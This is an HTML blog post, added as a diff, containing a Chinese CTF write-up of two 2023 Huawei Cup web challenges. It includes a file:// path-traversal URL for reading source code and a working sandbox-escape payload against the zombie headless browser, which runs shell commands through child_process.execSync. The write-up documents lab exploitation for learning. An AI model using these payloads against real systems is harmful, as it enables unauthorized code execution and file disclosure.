@@ -1,0 +1,243 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023华为杯初赛WP]easyeval+startschool | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023华为杯初赛WP]easyeval+startschool | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="希望下次可以碰JAVA了🙏
+easyeval
+首先用file协议读出dasdjf.php源码，file://localhost/../../../../../var/www/html/dasdjf.php
+
+dasdjf.php中有eva..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023华为杯初赛WP]easyeval+startschool
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-29
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-hua-wei-bei-chu-sai-wpeasyevalstartschool.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>希望下次可以碰JAVA了🙏</p>
+<h1 id="easyeval">easyeval</h1>
+<p>首先用file协议读出dasdjf.php源码，<code>file://localhost/../../../../../var/www/html/dasdjf.php</code><br>
+<img src="https://skyblu3519.github.io/post-images/1695996965864.png" alt="" loading="lazy"></p>
+<p>dasdjf.php中有eval可以执行system，虽然不能用cat，但读到flag的方式太多了。<br>
+<img src="https://skyblu3519.github.io/post-images/1695997091660.png" alt="" loading="lazy"></p>
+<h1 id="startschool">startschool</h1>
+<p>给了源码</p>
+<pre><code class="language-js">data_path = &quot;data.html&quot;;
+
+//主页
+app.get('/', function(req, res) {
+	res.sendFile(path.join(__dirname, 'public/index.html'));
+});
+
+
+app.post('/do', function(req, res) {
+	fs.writeFile('data.html',&quot; 姓名:&quot;+req.body.name+&quot;&lt;br\&gt; 年龄:&quot;+req.body.age+&quot;&lt;br\&gt; 专业:&quot;+req.body.subject+&quot;&lt;br\&gt; 邮箱:&quot;+req.body.mail+&quot;\n&quot;,function(error){
+		console.log(&quot;wriet error&quot;)
+	});
+	bot.visit();
+	res.send(&quot;&lt;script&gt;alert('提交成功');window.location.href = '/';&lt;/script&gt;&quot;);
+});
+
+
+app.route('/view')
+  .get(function(req, res) {
+    res.sendFile(path.join(__dirname, data_path));
+  })
+  .post(function(req, res) {
+	fs.writeFile('data.html',&quot; 姓名:&quot;+req.body.name+&quot;&lt;br\&gt; 年龄:&quot;+req.body.age+&quot;&lt;br\&gt; 专业:&quot;+req.body.subject+&quot;&lt;br\&gt; 邮箱:&quot;+req.body.mail+&quot;\n&quot;,function(error){
+		console.log(&quot;write error&quot;)
+	});
+    res.redirect('/view');
+  });
+</code></pre>
+<p>view和do的POST可以写信息到<code>data.html</code>，view的GET可以将其展示，此外do还会让让bot去访问<code>view</code>。bot的代码如下</p>
+<pre><code class="language-js">const zombie = require(&quot;zombie&quot;)
+
+exports.visit = async function () {
+    const browser = new zombie ({
+        waitDuration: 5*1000,
+        localAddress: 0 
+   })
+
+    browser.setCookie({ name: 'admin', domain: '127.0.0.1', path:'/', httpOnly: 'true'})
+
+    browser.visit(&quot;http://127.0.0.1/view&quot;,function() {
+        console.log(&quot;Visited: &quot;, &quot;http://127.0.0.1/view&quot;)
+})    
+}
+</code></pre>
+<p>因为对输入没有过滤，所以考虑怎么攻击这个bot。</p>
+<p>搜了下，发现zombie有个沙箱绕过可以RCE，参考链接：<a href="https://www.viewofthai.link/2022/04/14/node%E6%BC%8F%E6%B4%9E/">node漏洞</a>。虽然原理不太清楚，但知道了执行命令的payload：<code>this.__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('calc')</code></p>
+<p>环境出不了网，就吧命令执行的结果写到<code>data.html</code>里面。payload：</p>
+<pre><code class="language-js">&lt;script&gt;let r=this.__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('ls /').toString();this.__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync(`echo &quot;${r}&quot; &gt;&gt; public/index.html`);&lt;/script&gt;
+</code></pre>
+<p>表单提交，然后GET访问/view就可以了<br>
+<img src="https://skyblu3519.github.io/post-images/1695997937733.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#easyeval">easyeval</a></li>
+<li><a href="#startschool">startschool</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/java-an-quan-xue-xi-2/">
+              <h3 class="post-title">
+                JAVA安全学习（2）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
